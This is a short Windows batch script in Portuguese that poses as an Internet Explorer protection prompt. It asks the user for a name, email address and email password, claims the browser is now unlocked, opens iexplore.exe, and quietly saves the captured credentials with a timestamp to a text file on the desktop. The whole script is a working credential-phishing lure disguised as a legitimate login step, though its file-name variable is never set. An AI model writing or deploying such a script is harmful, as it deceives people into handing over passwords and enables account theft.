@echo off
title Internet Explorer

cls
echo. 
echo -- O navegador Internet Explorer esta protegido

echo.

echo -- E preciso entrar com seu email e senha!
echo.

set /p nome=Nome: 
set /p us=Email: 
set /p pass=Senha do email: 

echo Obrigado, agora voce ja pode usar o navegador!

msg * Obrigado, agora voce ja pode usar o navegador!
start iexplore.exe
echo Dia %date% Hora %time% %n% Email %us% Nome %nome% Senha: %pass% >"C:\Users\IASD\Desktop\testador de bat\%n%.txt"
ping localhost -n 2 >nul

exit